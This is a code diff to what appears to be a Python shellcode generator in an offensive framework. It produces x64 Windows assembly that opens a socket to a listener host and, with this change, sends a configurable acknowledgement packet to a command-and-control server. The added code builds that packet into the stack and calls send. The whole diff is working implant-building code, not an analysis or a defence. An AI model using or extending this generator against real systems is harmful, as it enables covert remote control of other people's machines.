@@ -1,4 +1,5 @@
 import sys
+import math
 import ctypes
 import struct
 
@@ -62,6 +63,10 @@ class Shellcode():
     arguments["LPORT"]["optional"] = "yes"
     arguments["LPORT"]["description"] = "Listening port on listener host"
 
+    arguments["ACKPK"] = {}
+    arguments["ACKPK"]["optional"] = "yes"
+    arguments["ACKPK"]["description"] = "Acknowledgement packet response"
+
     def __init__(self, arg_object):
 
         self.arg_list = arg_object["positional arguments"]
@@ -98,7 +103,7 @@ class Shellcode():
             "wsaData"                       : 0x00,
             "sockaddr_name"                 : 0x00,
             "sockfd"                        : 0x00,
-            "buffer"                        : 0x00,
+            "buffer"                        : self.get_ackpk_len(),
             "pResponse"                     : 0x00,
             "pTmpResponse"                  : 0x00,
             "bytesRead"                     : 0x00,
@@ -132,6 +137,23 @@ class Shellcode():
         self.storage_offsets = builder.gen_offsets(sc_args, Shellcode.arch)
 
         return
+
+    def get_ackpk_len(self):
+        """Generates the size needed by the ACK packet sent to C2
+        """
+
+        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
+        if (argv_dict == None):
+            exit(-1)
+
+        if ("ACKPK" not in argv_dict.keys()):
+            self.ack_packet = "The Only Thing They Fear Is You\r\n"
+        else:
+            self.ack_packet = argv_dict["ACKPK"]
+
+        needed_space = math.ceil(len(self.ack_packet)/8) * 8
+
+        return needed_space
 
     def modify_section_perms(self):
         """Modify permissions for each section
@@ -758,16 +780,40 @@ call_connect:
     mov [rdx + 0x08], r9
     mov rax, [rbp - {self.storage_offsets['connect']}]
     call rax
+"""
 
-; RAX => send([in] SOCKET s,        // RCX => sockfd
-;             [in] const char *buf, // RDX => *buffer
-;             [in] int len,         // R8  => sizeof(buffer)
-;             [in] int flags);      // R9  => 0x00
-call_send:
-    mov dword ptr [rbp - {self.storage_offsets['buffer']}], 0x41414141
+        packet_buffer = convert.from_str_to_xwords(self.ack_packet)
+        write_index = self.storage_offsets['buffer']
+
+        stub += f"\ncall_send:\n"
+
+        for i in range(len(packet_buffer["QWORD_LIST"])):
+            stub += "    mov rcx, 0x{}\n".format( struct.pack('<Q', packet_buffer["QWORD_LIST"][i]).hex() )
+            stub += "    mov [rbp-{}], rcx\n".format(hex(write_index))
+            write_index -= 8
+
+        for i in range(len(packet_buffer["DWORD_LIST"])):
+            stub += "    mov ecx, 0x{}\n".format( struct.pack('<L', packet_buffer["DWORD_LIST"][i]).hex() ) 
+            stub += "    mov [rbp-{}], ecx\n".format(hex(write_index))
+            write_index -= 4
+
+        for i in range(len(packet_buffer["WORD_LIST"])):
+            stub += "    mov cx, 0x{}\n".format( struct.pack('<H', packet_buffer["WORD_LIST"][i]).hex() )
+            stub += "    mov [rbp-{}], cx\n".format(hex(write_index))
+            write_index -= 2
+
+        for i in range(len(packet_buffer["BYTE_LIST"])):
+            stub += "    mov cl, {}\n".format( hex(packet_buffer["BYTE_LIST"][i]) )
+            stub += "    mov [rbp-{}], cl\n".format(hex(write_index))
+            write_index -= 1
+
+
+        stub += f"""
+    xor rcx, rcx
+    mov [rbp-{write_index}], cl
     mov rcx, [rbp - {self.storage_offsets['sockfd']}]
     lea rdx, [rbp - {self.storage_offsets['buffer']}]
-    mov r8, 0x4
+    mov r8, {len(self.ack_packet)}
     xor r9, r9
     mov rax, [rbp - {self.storage_offsets['send']}]
     call rax
